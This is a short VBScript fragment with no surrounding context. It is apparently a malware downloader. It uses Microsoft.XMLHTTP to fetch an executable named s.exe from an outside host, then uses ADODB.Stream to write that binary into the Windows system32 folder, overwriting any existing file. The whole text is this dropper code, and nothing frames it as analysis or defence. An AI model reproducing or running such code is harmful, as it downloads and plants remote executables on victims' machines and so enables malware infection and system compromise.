Set xPost = CreateObject("Microsoft.XMLHTTP")  
xPost.Open "GET","Http://hjk.v8.8210.cn/s.exe",0  
xPost.Send()  
Set sGet = CreateObject("ADODB.Stream")  
sGet.Mode = 3  
sGet.Type = 1  
sGet.Open()  
sGet.Write(xPost.responseBody)  
sGet.SaveToFile "C:\WINNT\system32\s",2 
